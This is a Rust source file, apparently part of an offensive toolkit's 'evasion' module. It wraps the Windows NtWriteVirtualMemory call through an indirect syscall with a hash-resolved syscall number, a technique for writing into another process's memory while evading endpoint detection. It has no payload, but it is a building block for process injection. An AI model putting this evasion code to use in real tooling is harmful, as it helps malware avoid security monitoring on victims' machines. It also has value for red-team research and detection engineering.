#![allow(non_camel_case_types)]
#![allow(non_snake_case)]
use crate::techniques::evasion::execution::dinamic_ssn::get_dinamic_ssn;
use crate::techniques::evasion::execution::indirect_syscall::indirect_syscall_6;
use super::utils::HANDLE;

/*
nt_write_virtual_memory seria como escribir en la memoria de un proceso desde el kernel.
*/

pub fn nt_write_virtual_memory(
    process_handle: HANDLE,
    base_address: usize,
    data: &[u8],
) -> Result<usize, String> {
    //devuelve el numero de bytes escritos
    let hash_nt_write_vm = 0x7f603ee9;
    let ssn = get_dinamic_ssn(hash_nt_write_vm)?;

    let mut number_of_bytes_written: usize = 0;

    unsafe {
        let status = indirect_syscall_6(
            hash_nt_write_vm,
            ssn,
            process_handle as usize,
            base_address,
            data.as_ptr() as usize,
            data.len(),
            &mut number_of_bytes_written as *mut usize as usize,
            0,
        );

        match status {
            Ok(return_value) => match return_value {
                0 => Ok(number_of_bytes_written),
                _ => Err(format!(
                    "Error en la llamada a NtWriteVirtualMemory: {:#X}",
                    return_value
                )),
            },
            Err(e) => Err(e),
        }
    }
}
